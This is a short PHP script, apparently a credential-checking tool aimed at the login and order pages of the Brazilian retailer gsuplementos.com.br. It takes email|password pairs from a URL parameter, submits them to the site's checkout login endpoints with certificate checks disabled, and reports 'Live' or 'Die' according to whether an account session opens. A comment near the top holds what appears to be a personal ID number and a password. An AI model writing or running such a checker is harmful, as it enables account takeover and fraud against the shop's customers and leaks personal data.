<?php
error_reporting(0);
#004.762.845-62|%40Mamaefoca23
if (file_exists("cookie.txt")!== false) {unlink("cookie.txt");fopen
("cookie.txt", 'w+');fclose
("cookie.txt");}else{fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}

  function trazer($string, $start, $end) {
   $str = explode($start, $string);
   $str = explode($end, $str[1]);  
   return $str[0];
 }

 function multiexplode($string) {
   $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
   $one = str_replace($delimiters, $delimiters[0], $string);
   $two = explode($delimiters[0], $one);
   return $two;
 }

 $lista = $_GET['lista'];
 $email = multiexplode($lista)[0];
 $senha = multiexplode($lista)[1];


#requests
 function request($url, $method){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
  curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'origin: https://www.gsuplementos.com.br'
  ));
  curl_setopt($ch, CURLOPT_POSTFIELDS, $method);
  return curl_exec($ch);
}

request('https://www.gsuplementos.com.br/checkout/acesso/','');
request('https://www.gsuplementos.com.br/checkout/ajax/ajax-checkout-acesso.php','email='.$email.'&senha=');
request('https://www.gsuplementos.com.br/checkout/ajax/ajax-checkout-acesso.php','email=&senha='.$senha);

$p1 = request('https://www.gsuplementos.com.br/minha-conta/pedido','');

if (strpos($p1, 'menuConta-sairTxt')) {
  echo "Live";
}else{
  echo "Die";
}

?>